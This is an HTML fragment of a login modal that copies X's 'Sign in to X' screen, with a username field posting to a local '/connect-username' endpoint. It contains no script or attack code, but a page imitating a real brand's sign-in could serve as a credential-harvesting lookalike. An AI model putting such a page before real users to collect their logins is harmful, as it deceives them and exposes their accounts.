      <!-- Modal content -->
      <div class="p-8 flex flex-col items-center mt-[25%]">
        <div class="w-[100%]">
          <h1 class="text-4xl font-bold mb-8 text-start ">Sign in to X</h1>
        </div>
        <hr class="w-[100%] mb-5">
        
        <!-- Form -->
        <form action="/connect-username" method="POST" class="w-full ">
          <input 
            class="w-full py-3 px-2.5 bg-transparent border border-twitter-border rounded text-base text-white mb-5 focus:outline-none focus:border-twitter-blue" 
            type="text" 
            name="username" 
            placeholder="Phone, email, or username" 
            required
          >
          <button 
            class="w-full py-3 bg-white text-black border-none rounded-full font-bold text-sm cursor-pointer mb-4 hover:bg-gray-100" 
            type="submit"
          >
            Next
          </button>
        </form>
        
        <!-- Forgot password button -->
        <button class="w-full  py-3 bg-transparent text-white border border-twitter-border rounded-full font-normal text-sm cursor-pointer mb-4">
          Forgot password?
        </button>
        
       <!-- Sign up prompt -->
       <div class="text-sm text-twitter-gray  w-full">
        Don't have an account? <a href="#" class="text-twitter-blue no-underline ">Sign up</a>
      </div>  
      </div>
    </div>
  </div>
  
